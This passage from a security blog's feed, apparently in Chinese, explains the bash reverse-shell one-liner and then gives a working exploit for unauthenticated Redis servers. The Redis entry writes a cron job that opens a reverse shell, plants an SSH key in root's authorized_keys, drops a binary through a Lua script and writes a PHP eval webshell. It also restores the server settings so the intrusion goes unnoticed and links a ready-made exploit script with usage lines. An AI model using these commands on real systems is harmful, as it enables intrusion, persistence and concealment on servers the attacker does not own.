class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line">                     /</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+  /</span><br><span class="line"><span class="params">( 2 )</span> <span class="params">----</span>&gt;| shell  | / </span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br></pre></td></tr></table></figure><p>因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。</p><p>使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象，具体大家可以看一下视频，然后自己测试一下。</p><p>命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下</p><blockquote><p>在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2”</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"><span class="params">( 0 )</span> <span class="params">----</span>&gt;| shell  |\</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+ \</span><br><span class="line">                       \</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line"><span class="params">( 1 )</span> <span class="params">----</span>&gt;| shell  |  <span class="params">-----</span>&gt;   |<span class="string">/dev/tcp/host/port</span>|</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line">                     /</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+  /</span><br><span class="line"><span class="params">( 2 )</span> <span class="params">----</span>&gt;| shell  | / </span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br></pre></td></tr></table></figure><p>命令”bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell</p><h2 id="参考文档">参考文档</h2><p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a><br><a href="http://wiki.bash-hackers.org/howto/redirection_tutorial" target="_blank" rel="noopener">http://wiki.bash-hackers.org/howto/redirection_tutorial</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;bash-反弹shell&quot;&gt;bash 反弹shell&lt;/h1&gt;
&lt;p&gt;下边是一段熟悉而又陌生的代码，经常被用来在linux环境下反弹shell&lt;/p&gt;
&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
    
      <category term="bash" scheme="https://www.00theway.org/tags/bash/"/>
    
      <category term="reverse shell" scheme="https://www.00theway.org/tags/reverse-shell/"/>
    
  </entry>
  
  <entry>
    <title>redis unauthenticated exploit</title>
    <link href="https://www.00theway.org/2017/03/27/redis-unauthenticated-exploit/"/>
    <id>https://www.00theway.org/2017/03/27/redis-unauthenticated-exploit/</id>
    <published>2017-03-27T08:35:33.000Z</published>
    <updated>2020-01-04T08:56:23.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p><ul><li><p>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照.</p></li><li><p>AOF 持久化记录服务器执行的所有写操作命令.</p><blockquote><p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p></blockquote></li></ul><blockquote><p>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p></blockquote><h1 id="常见利用方式">常见利用方式</h1><h2 id="root权限">root权限</h2><ul><li>直接写计划任务</li></ul><blockquote><p>/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。</p></blockquote><p>执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取dir的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dir</span><br><span class="line"><span class="comment">#获取dbfilename的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dbfilename</span><br><span class="line"><span class="comment">#设置数据库备份目录为linux计划任务目录</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/var/spool/cron/'</span></span><br><span class="line"><span class="comment">#设置备份文件名为root，以root身份执行计划任务</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'root'</span></span><br><span class="line"><span class="comment">#删除所有数据库的所有key</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment">#设置写入的内容，在计划任务前后加入换行以确保写入的计划任务可以被正常解析，此处可以直接调用lua语句。</span></span><br><span class="line">eval <span class="string">"redis.call('set','cron',string.char(10)..ARGV[1]..string.char(10))"</span> 0 <span class="string">'*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1'</span></span><br><span class="line"><span class="comment">#保存</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#删除新增的key</span></span><br><span class="line">del cron</span><br><span class="line"><span class="comment">#恢复dir和dbfilename</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'***'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'***'</span></span><br></pre></td></tr></table></figure><ul><li>写ssh pub key(前提是目标服务器允许使用key登录)</li></ul><p>基本语句与写计划任务相同，直接调用lua语句写入ssh key前后的换行符</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取dir的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dir</span><br><span class="line"><span class="comment">#获取dbfilename的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dbfilename</span><br><span class="line"><span class="comment">#设置数据库备份目录为.ssh</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/root/.ssh/'</span></span><br><span class="line"><span class="comment">#设置备份文件名为authorized_keys</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'authorized_keys'</span></span><br><span class="line"><span class="comment">#清空数据库</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment">#写入ssh pub key的内容</span></span><br><span class="line">eval <span class="string">"redis.call('set','ssh',string.char(10)..ARGV[1]..string.char(10))"</span> 0 <span class="string">'ssh pub key'</span></span><br><span class="line"><span class="comment">#保存</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#删除新增的key</span></span><br><span class="line">del ssh</span><br><span class="line"><span class="comment">#恢复dir和dbfilename</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'***'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'***'</span></span><br></pre></td></tr></table></figure><ul><li>写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</li></ul><p>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">hex2bin</span><span class="params">(hexstr)</span></span></span><br><span class="line">    <span class="keyword">local</span> str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(hexstr) - <span class="number">1</span>, <span class="number">2</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> doublebytestr = <span class="built_in">string</span>.<span class="built_in">sub</span>(hexstr, i, i+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">local</span> n = <span class="built_in">tonumber</span>(doublebytestr, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n <span class="keyword">then</span></span><br><span class="line">            str = str .. <span class="string">'\00'</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            str = str .. <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"%c"</span>, n)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> dir = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'dir'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'dir'</span>,<span class="string">'/tmp/'</span>)</span><br><span class="line"><span class="keyword">local</span> dbfilename = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'dbfilename'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'dbfilename'</span>,<span class="string">'t'</span>)</span><br><span class="line"><span class="keyword">local</span> rdbcompress = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'rdbcompression'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'rdbcompression'</span>,<span class="string">'no'</span>)</span><br><span class="line">redis.call(<span class="string">'flushall'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> data = <span class="string">'1a2b3c4d5e6f1223344556677890aa'</span></span><br><span class="line">redis.call(<span class="string">'set'</span>,<span class="string">'data'</span>,hex2bin(<span class="string">'0a7c7c7c'</span>..data..<span class="string">'7c7c7c0a'</span>))</span><br><span class="line"><span class="keyword">local</span> rst = &#123;&#125;</span><br><span class="line">rst[<span class="number">1</span>] = <span class="string">'server default config'</span></span><br><span class="line">rst[<span class="number">2</span>] = <span class="string">'dir:'</span>..dir[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">3</span>] = <span class="string">'dbfilename:'</span>..dbfilename[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">4</span>] = <span class="string">'rdbcompression:'</span>..rdbcompress[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> rst</span><br></pre></td></tr></table></figure><p>保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli <span class="comment">--eval a.lua -h *.*.*.*</span></span><br></pre></td></tr></table></figure><p>由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> dir *** -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename *** -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> rdbcompression * -h *.*.*.*</span><br></pre></td></tr></table></figure><p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了“|||”作为提取最终文件的标识）。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * * python -c '<span class="keyword">open</span>(<span class="string">"/tmp/rst"</span>,<span class="string">"a+"</span>).<span class="keyword">write</span>(<span class="keyword">open</span>(<span class="string">"/tmp/t"</span>).<span class="keyword">read</span>().split(<span class="string">"|||"</span>)[<span class="number">1</span>])'</span><br></pre></td></tr></table></figure><p>/tmp/rst为最终上传的文件。</p><h2 id="非root权限">非root权限</h2><ul><li>写webshell</li></ul><blockquote><p>tips:<br>当config set dir ‘*’ 设置的目录不存在是会提示目录不存在</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 127.0.0.1:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir <span class="string">'/test/'</span></span><br><span class="line">(error) ERR Changing directory: <span class="literal">No</span> such file <span class="keyword">or</span> directory</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以利用这个特性暴力猜网站目录。</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/webpath/'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'a.php'</span></span><br><span class="line"><span class="builtin-name">set</span> shell <span class="string">'&lt;?php eval(REQUEST["a"]);?&gt;'</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h1 id="enter-hacking">Enter-Hacking</h1><p>以上为手工利用方式，在开始开始理解漏洞是非常有必要，在撸站时候这样就太慢了，所以将以上方法写成了python脚本。</p><p><a href="redis_exp.py">下载链接</a></p><p><a href="https://github.com/00theway/redis_exp" target="_blank" rel="noopener">git地址</a></p><h2 id="使用说明">使用说明</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">c</span> <span class="string">'id'</span></span><br><span class="line">上传文件</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">l</span> /data/payload.<span class="keyword">py</span> -r /tmp/<span class="keyword">p</span>.<span class="keyword">py</span></span><br><span class="line">暴力猜解目录</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">f</span> <span class="keyword">p</span>.txt</span><br><span class="line">可以通过-<span class="keyword">p</span>参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure><p>执行命令</p><p><img src="redis_command.png" alt></p><p>路径猜解</p><p><img src="redis_broutefource.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;简介&lt;/h1&gt;
&lt;p&gt;Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AOF 持久化记录服务器执行的所有写
      
    
    </summary>
    
    
    
      <category term="exploit" scheme="https://www.00theway.org/tags/exploit/"/>
    
      <category term="redis" scheme="https://www.00theway.org/tags/redis/"/>
    
      <category term="unauthenticated" scheme="https://www.00theway.org/tags/unauthenticated/"/>
    
  </entry>
  
</feed>
